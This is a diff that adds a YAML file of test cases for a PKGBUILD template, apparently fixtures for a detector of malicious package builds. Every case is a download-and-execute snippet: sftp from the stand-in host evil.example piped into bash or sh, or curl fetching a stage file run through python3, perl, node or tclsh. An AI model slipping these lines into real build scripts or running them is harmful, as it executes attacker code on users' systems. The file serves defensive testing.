@@ -1,0 +1,32 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    p1: |2
+        sftp -b - u@evil.example <<< "get /s.sh"
+        bash < s.sh
+  id: 001-stdin-bash
+- vars:
+    p1: |2
+        sftp -b - u@evil.example <<< "get /s.sh"
+        sh -s < s.sh
+  id: 002-stdin-sh-s
+- vars:
+    p1: |2
+        curl -fsSL -o stage.pl "$(cat "$srcdir/url.txt")"
+        python3 < stage.pl
+  id: 007-stdin-python3
+- vars:
+    p1: |2
+        curl -fsSL -o stage.pl "$(cat "$srcdir/url.txt")"
+        perl < stage.pl
+  id: 008-stdin-perl
+- vars:
+    p1: |2
+        curl -fsSL -o stage.pl "$(cat "$srcdir/url.txt")"
+        node < stage.pl
+  id: 010-stdin-node
+- vars:
+    p1: |2
+        curl -fsSL -o stage.pl "$(cat "$srcdir/url.txt")"
+        tclsh < stage.pl
+  id: 013-stdin-tclsh
